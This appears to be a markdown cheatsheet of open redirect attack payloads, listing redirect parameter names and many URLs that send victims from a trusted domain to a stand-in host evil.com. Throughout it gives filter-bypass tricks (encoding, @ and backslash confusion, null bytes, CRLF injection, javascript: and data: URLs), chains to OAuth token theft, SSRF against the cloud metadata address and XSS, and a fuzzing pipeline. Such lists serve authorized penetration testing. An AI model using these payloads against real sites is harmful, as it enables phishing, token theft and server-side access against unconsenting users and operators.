# 🔀 Open Redirect Cheatsheet

```
   ██████╗ ██████╗ ███████╗███╗   ██╗    ██████╗ ███████╗██████╗ ██╗██████╗ ███████╗ ██████╗████████╗
  ██╔═══██╗██╔══██╗██╔════╝████╗  ██║    ██╔══██╗██╔════╝██╔══██╗██║██╔══██╗██╔════╝██╔════╝╚══██╔══╝
  ██║   ██║██████╔╝█████╗  ██╔██╗ ██║    ██████╔╝█████╗  ██║  ██║██║██████╔╝█████╗  ██║        ██║   
  ██║   ██║██╔═══╝ ██╔══╝  ██║╚██╗██║    ██╔══██╗██╔══╝  ██║  ██║██║██╔══██╗██╔══╝  ██║        ██║   
  ╚██████╔╝██║     ███████╗██║ ╚████║    ██║  ██║███████╗██████╔╝██║██║  ██║███████╗╚██████╗   ██║   
   ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═══╝    ╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝╚═╝  ╚═╝╚══════╝ ╚═════╝   ╚═╝   
```

---

## 🎯 What is Open Redirect

**Open Redirect** allows attackers to redirect users to malicious sites using trusted domains - useful for phishing and chaining with other vulns.

---

## 🔍 Common Parameters

```
url=
redirect=
redirect_uri=
redirect_url=
next=
next_url=
return=
return_url=
rurl=
dest=
destination=
redir=
redirect_uri=
return_to=
checkout_url=
continue=
image_url=
go=
view=
to=
out=
ref=
callback=
```

---

## 💉 Payloads

### Basic
```
https://target.com/redirect?url=https://evil.com
https://target.com/redirect?url=http://evil.com
https://target.com/redirect?url=//evil.com
```

### Protocol-less
```
//evil.com
///evil.com
////evil.com
/\/evil.com
```

### Using @ Symbol
```
https://target.com@evil.com
https://target.com%40evil.com
//target.com@evil.com
```

### Backslash Tricks
```
https://evil.com\@target.com
//evil.com\@target.com
https://target.com/redirect?url=https://evil.com\.target.com
```

### URL Encoding
```
https://evil.com
https:%2f%2fevil.com
https:%252f%252fevil.com
%68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%63%6f%6d
```

### Domain Confusion
```
https://evil.com?.target.com
https://evil.com#.target.com
https://evil.com\.target.com
https://target.com.evil.com
https://targetcom.evil.com
```

### NULL Bytes
```
https://evil.com%00.target.com
https://evil.com%00@target.com
```

### CRLF Injection
```
https://target.com/redirect?url=%0d%0aLocation:%20https://evil.com
```

### JavaScript Redirect
```
javascript:alert(1)
javascript://target.com/%0d%0aalert(1)
data:text/html,<script>location='https://evil.com'</script>
```

---

## 🛡️ Bypass Techniques

### If Whitelist Checked
```
# Subdomain bypass
https://target.com.evil.com
https://evil.target.com
https://targetcom.evil.com

# Path bypass
https://target.com/https://evil.com
https://target.com//evil.com
```

### If Only HTTPS Allowed
```
https://evil.com
https://evil.com%2f%2ftarget.com
```

### Localhost Tricks
```
http://localhost
http://127.0.0.1
http://[::1]
```

---

## 🔗 Chaining Open Redirects

### OAuth Token Theft
```
https://target.com/oauth?redirect_uri=https://evil.com
→ Steal OAuth tokens
```

### SSRF Chain
```
https://target.com/redirect?url=http://169.254.169.254/
```

### XSS Chain
```
https://target.com/redirect?url=javascript:alert(document.domain)
```

---

## 📊 Quick Reference

| Payload Type | Example |
|--------------|---------|
| Basic | `//evil.com` |
| @ Symbol | `https://target.com@evil.com` |
| Encoding | `https:%2f%2fevil.com` |
| Domain confusion | `https://target.com.evil.com` |
| JavaScript | `javascript:alert(1)` |

---

## 🛠️ Tools

```bash
# GF patterns
gau target.com | gf redirect

# Manual testing
echo "https://target.com/r?url=FUZZ" | \
  qsreplace "https://evil.com" | \
  httpx -silent -location
```

---

## 📚 Resources

- [PortSwigger Open Redirect](https://portswigger.net/kb/issues/00500100_open-redirection-reflected)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect)

---

<p align="center">
  <b>🔀 Exploit Redirects!</b><br>
  <i>For authorized testing only!</i>
</p>
